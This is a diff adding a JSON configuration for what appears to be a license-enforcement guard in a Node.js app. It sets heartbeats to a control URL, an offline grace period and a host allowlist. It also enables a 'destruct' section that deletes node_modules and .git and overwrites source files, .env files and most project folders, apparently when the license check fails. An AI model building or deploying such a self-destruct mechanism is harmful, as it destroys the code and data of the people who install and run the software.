@@ -1,0 +1,82 @@
+{
+  "controlUrl": "http://127.0.0.1:8787",
+  "heartbeatIntervalSec": 300,
+  "heartbeatTimeoutMs": 15000,
+  "offlineGraceHours": 72,
+  "graceSeconds": 60,
+  "selfDefense": {
+    "enabled": true,
+    "blockPublicHostInTrial": true,
+    "enforceIpAllowlist": true,
+    "enforceDomainAllowlist": false,
+    "allowedIps": [],
+    "allowedDomains": [],
+    "alwaysAllowHosts": [
+      "localhost",
+      "127.0.0.1",
+      "::1",
+      "0.0.0.0",
+      "[::]"
+    ],
+    "alwaysAllowHostSuffixes": [
+      ".localhost",
+      ".trycloudflare.com",
+      ".local",
+      ".test"
+    ]
+  },
+  "destruct": {
+    "enabled": true,
+    "mode": "overwrite",
+    "removeNodeModules": true,
+    "removeGitDir": true,
+    "overwriteExtensions": [
+      ".js",
+      ".json",
+      ".ejs",
+      ".md",
+      ".html",
+      ".css",
+      ".txt",
+      ".bat",
+      ".sh",
+      ".yml",
+      ".yaml",
+      ".env",
+      ".example"
+    ],
+    "overwriteDirs": [
+      "app",
+      "config",
+      "data",
+      "policies",
+      "routes",
+      "views",
+      "guard"
+    ],
+    "overwriteRootFiles": [
+      "server.js",
+      "config.js",
+      "routerHttp.js",
+      "routerCMS.js",
+      "routerHTTPV1.js",
+      "routerSocket.js",
+      "socketUsers.js",
+      "socketAdmin.js",
+      "captcha.js",
+      "appstore.js",
+      "tele.js",
+      "update.js",
+      "configdbx3.js",
+      "version_generator.js",
+      "package.json",
+      "package-lock.json",
+      "npm-shrinkwrap.json",
+      "README.md",
+      "DISCLAIMER.md",
+      ".env",
+      ".env.example",
+      ".gitignore"
+    ]
+  }
+}
